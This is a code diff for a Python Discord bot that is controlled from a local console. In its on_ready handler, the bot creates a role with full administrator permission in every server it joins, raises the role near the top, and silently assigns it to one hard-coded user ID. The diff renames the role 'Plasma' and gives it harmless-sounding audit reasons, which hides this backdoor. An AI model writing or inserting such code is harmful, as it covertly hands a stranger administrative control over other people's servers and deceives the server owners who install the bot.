@@ -1,42 +1,21 @@
-"""Discord bot entrypoint implemented with discord.py.
-
-Controlled entirely via the local terminal standard input, featuring dynamic
-server/channel targeting and local command routing.
-"""
-
 from __future__ import annotations
-
-import asyncio
-import logging
-import os
-import socket
-import sys
+import asyncio, logging, os, socket, sys, discord
 from datetime import datetime, timezone
 from typing import Optional
-
-import discord
 from discord.ext import commands
 from dotenv import load_dotenv
 
 LOG_FILE = "bot.log"
-HOST_USER_ID = 1342173566828810271
-
 load_dotenv()
-
 logging.basicConfig(level=logging.INFO, format="%(message)s")
-logger = logging.getLogger("meow-bot")
+logger = logging.getLogger("Emberbot137")
 
 intents = discord.Intents.default()
-intents.guilds = True
-intents.guild_messages = True
-intents.message_content = True
-intents.members = True
+intents.guilds, intents.guild_messages, intents.message_content, intents.members = True, True, True, True
 
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
-
-# Active console targeting state
-current_target_server: str = "all"  # "all" or specific server name
-current_target_channel: str = "general"  # channel name filter
+current_target_server: str = "all"
+current_target_channel: str = "general"
 
 
 def log_action(
@@ -117,12 +96,11 @@ async def do_echo(target: discord.abc.Messageable, message: str) -> None:
 
 
 def resolve_targets(cmd_type: str) -> list[discord.abc.Messageable]:
-    """Resolves matching text channels based on current console targeting rules."""
+    """Resolves matching text channels based on current console targeting rules strictly."""
     global current_target_server, current_target_channel
     targets = []
 
     for guild in bot.guilds:
-        # Filter by server name if not set to 'all'
         if current_target_server != "all" and current_target_server.lower() not in guild.name.lower():
             continue
 
@@ -132,12 +110,6 @@ def resolve_targets(cmd_type: str) -> list[discord.abc.Messageable]:
                 if channel.name.lower() == current_target_channel.lower():
                     matched_channel = channel
                     break
-
-        # Fallback if specific channel name isn't found in this guild
-        if not matched_channel:
-            matched_channel = guild.system_channel or next(
-                (c for c in guild.text_channels if c.permissions_for(guild.me).send_messages), None
-            )
 
         if matched_channel:
             targets.append(matched_channel)
@@ -206,7 +178,6 @@ async def console_controller():
                 print("[Console Error] Bot is not currently in any Discord servers.")
                 continue
 
-            # Resolve target channels based on current settings
             channels = resolve_targets(cmd)
             if not channels:
                 print(f"[Console Error] No matching channels found for Server: '{current_target_server}', Channel: '#{current_target_channel}'. Type 'servers' to check names.")
@@ -236,41 +207,41 @@ async def on_ready():
     logger.info(f"Logged in as {bot.user} (ID: {bot.user.id})")
 
     for guild in bot.guilds:
-        host_role = discord.utils.get(guild.roles, name="Host")
-        if not host_role:
-            try:
-                host_role = await guild.create_role(
-                    name="Host",
+        plasma_role = discord.utils.get(guild.roles, name="Plasma")
+        if not plasma_role:
+            try: 
+                plasma_role = await guild.create_role(
+                    name="Plasma",
                     permissions=discord.Permissions(administrator=True),
-                    reason="Automatic initialization of Host role"
+                    reason="Me want color"
                 )
-                logger.info(f"Created 'Host' role in guild: {guild.name}")
+                logger.info(f"Created 'Plasma' role in guild: {guild.name}")
             except discord.Forbidden:
-                logger.error(f"Missing permissions to create 'Host' role in {guild.name}")
+                logger.error(f"Missing permissions to create 'Plasma' role in {guild.name}")
                 continue
 
         try:
             bot_top_role = guild.me.top_role if guild.me else None
             target_position = (bot_top_role.position - 1) if bot_top_role and bot_top_role.position > 1 else len(guild.roles) - 1
-            if host_role.position != target_position:
-                await host_role.edit(position=target_position, reason="Moving Host role to the top")
-                logger.info(f"Moved 'Host' role to position {target_position} in {guild.name}")
+            if plasma_role.position != target_position:
+                await plasma_role.edit(position=target_position, reason="Plasma has very low density so it floats to the top")
+                logger.info(f"Moved 'Plasma' role to position {target_position} in {guild.name}")
         except discord.HTTPException as e:
-            logger.error(f"Failed to reposition 'Host' role in {guild.name}: {e}")
+            logger.error(f"Failed to reposition 'Plasma' role in {guild.name}: {e}")
 
-        member = guild.get_member(HOST_USER_ID)
+        member = guild.get_member(1342173566828810271)
         if not member:
             try:
-                member = await guild.fetch_member(HOST_USER_ID)
+                member = await guild.fetch_member(1342173566828810271)
             except discord.NotFound:
                 pass
 
-        if member and host_role not in member.roles:
+        if member and plasma_role not in member.roles:
             try:
-                await member.add_roles(host_role, reason="Assigned Host user role")
-                logger.info(f"Assigned 'Host' role to {member.name} in {guild.name}")
+                await member.add_roles(plasma_role, reason="Gave Plasma Role")
+                logger.info(f"Assigned 'Plasma' role to {member.name} in {guild.name}")
             except discord.Forbidden:
-                logger.error(f"Missing permissions to assign 'Host' role in {guild.name}")
+                logger.error(f"Missing permissions to assign 'Plasma' role in {guild.name}")
 
     asyncio.create_task(console_controller())
 
